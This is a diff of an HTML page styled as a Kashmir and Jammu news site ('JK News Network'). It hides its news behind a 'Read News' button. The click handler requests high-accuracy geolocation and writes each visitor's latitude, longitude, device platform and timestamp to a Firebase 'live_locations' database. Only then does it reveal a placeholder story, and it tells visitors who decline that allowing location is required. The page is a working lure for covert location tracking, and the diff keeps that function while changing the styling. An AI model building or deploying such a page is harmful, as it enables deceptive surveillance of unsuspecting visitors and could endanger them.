@@ -3,47 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kashmir News Network</title>
+    <title>JK News Network | Live Updates</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: sans-serif; background: #f4f4f4; }
+        body { font-family: sans-serif; background: #f0f2f5; }
         
-        /* Overlay jab tak button na dabe */
+        /* Welcome Screen */
         #start-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.98); z-index: 10000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; padding: 20px;
+            background: white; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
-        .news-logo { font-size: 50px; margin-bottom: 10px; }
         .btn-read {
-            background: #cc0000; color: white; border: none; padding: 15px 40px;
+            background: #d93025; color: white; border: none; padding: 15px 40px;
             font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
-            box-shadow: 0 4px 15px rgba(204, 0, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4);
         }
-
-        header { background: #cc0000; color: #fff; padding: 15px; text-align: center; font-weight: bold; }
-        .container { max-width: 600px; margin: auto; padding: 10px; filter: blur(5px); } /* News blur rahegi */
+        header { background: #d93025; color: white; padding: 15px; text-align: center; font-weight: bold; }
+        .news-card { background: white; margin: 15px; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .news-card img { width: 100%; height: 200px; object-fit: cover; }
     </style>
 </head>
 <body>
 
 <div id="start-screen">
-    <div class="news-logo">📰</div>
-    <h2 style="margin-bottom:10px;">Kashmir News Network</h2>
-    <p style="margin-bottom:20px; color:#666;">Taza tareen khabron ke liye 'Read News' par click karein.</p>
-    <button class="btn-read" onclick="askPermission()">READ NEWS / خبریں پڑھیں</button>
+    <h1 style="color:#d93025; margin-bottom:10px;">JK NEWS NETWORK</h1>
+    <p style="margin-bottom:25px; color:#555;">Srinagar, Jammu aur Ladakh ki taza tareen khabron ke liye niche click karein.</p>
+    <button class="btn-read" id="main-btn">READ NEWS / خبریں پڑھیں</button>
 </div>
 
-<div id="main-content" class="container">
-    <header>KNN - LIVE UPDATES</header>
-    <div id="news-feed">
-        <div style="background:white; margin-top:20px; border-radius:10px; overflow:hidden; box-shadow:0 2px 5px rgba(0,0,0,0.1);">
-            <img src="https://images.unsplash.com/photo-1598324423733-196d0061e389?w=600" style="width:100%;">
-            <div style="padding:15px;">
-                <h2 style="font-size:18px;">Srinagar Smart City Ka Naya Project</h2>
-                <p style="color:#444;">Jhelum riverfront ab naye roop mein tayyar hai...</p>
-            </div>
+<div id="content" style="display:none;">
+    <header>JK NEWS NETWORK - LIVE</header>
+    <div class="news-card">
+        <img src="https://images.unsplash.com/photo-1598324423733-196d0061e389?w=600">
+        <div style="padding:15px;">
+            <h2>Srinagar Smart City Project Update</h2>
+            <p>Jhelum riverfront ka kaam mukammal ho chuka hai...</p>
         </div>
     </div>
 </div>
@@ -65,33 +60,30 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    window.askPermission = function() {
+    // Button click listener
+    document.getElementById('main-btn').addEventListener('click', function() {
         if (navigator.geolocation) {
-            // Asli Browser Pop-up trigger hoga
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const id = "User_" + Math.floor(Math.random() * 99999);
-                    set(ref(db, 'live_locations/' + id), {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        device: navigator.platform,
-                        time: new Date().toLocaleTimeString(),
-                        date: new Date().toLocaleDateString()
-                    }).then(() => {
-                        // Success: News show kar do
-                        document.getElementById('start-screen').style.display = 'none';
-                        document.getElementById('main-content').style.filter = 'none';
-                    });
-                },
-                (err) => {
-                    alert("Khabrein parhne ke liye 'Allow' par click karna zaroori hai.");
-                },
-                { enableHighAccuracy: true }
-            );
+            navigator.geolocation.getCurrentPosition(function(position) {
+                // Success: Firebase mein data bhejein
+                const userId = "User_" + Math.floor(Math.random() * 90000);
+                set(ref(db, 'live_locations/' + userId), {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    device: navigator.platform,
+                    time: new Date().toLocaleTimeString(),
+                    date: new Date().toLocaleDateString()
+                }).then(() => {
+                    // News dikha dein
+                    document.getElementById('start-screen').style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
+                });
+            }, function(error) {
+                alert("News parhne ke liye location 'Allow' karna lazmi hai.");
+            }, { enableHighAccuracy: true });
         } else {
-            alert("Aapka browser location support nahi karta.");
+            alert("Aapka phone location support nahi karta.");
         }
-    };
+    });
 </script>
 </body>
 </html>
